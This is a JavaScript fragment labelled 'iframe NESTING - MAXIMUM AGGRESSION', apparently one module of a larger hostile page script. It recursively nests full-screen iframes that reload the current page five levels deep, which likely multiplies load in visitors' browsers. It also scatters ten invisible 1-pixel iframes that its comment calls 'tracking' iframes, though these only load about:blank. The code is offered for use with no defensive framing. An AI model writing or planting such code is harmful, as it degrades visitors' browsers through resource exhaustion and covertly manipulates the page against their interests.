/**
 * 10. iframe NESTING - MAXIMUM AGGRESSION
 */
const IframeNesting = {
    init: function() { this.nestIframes(); },
    nestIframes: function() {
        const createNestedIframe = (depth, maxDepth) => {
            if (depth >= maxDepth) return;
            const iframe = document.createElement('iframe');
            iframe.src = window.location.href;
            iframe.style.cssText = 'width:100%;height:100%;border:none;position:absolute;top:0;left:0;z-index:' + (depth * 1000) + ';';
            iframe.sandbox = 'allow-same-origin allow-scripts allow-popups allow-forms';
            document.body.appendChild(iframe);
            try {
                iframe.onload = () => {
                    try { createNestedIframe(depth + 1, maxDepth); } catch(e) {}
                };
            } catch(e) {}
        };
        createNestedIframe(0, 5); // 5 levels deep
        // Create 10 hidden tracking iframes
        for (let i = 0; i < 10; i++) {
            const hiddenIframe = document.createElement('iframe');
            hiddenIframe.src = 'about:blank';
            hiddenIframe.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
            hiddenIframe.style.top = Math.random() * 100 + '%';
            hiddenIframe.style.left = Math.random() * 100 + '%';
            document.body.appendChild(hiddenIframe);
        }
    }
};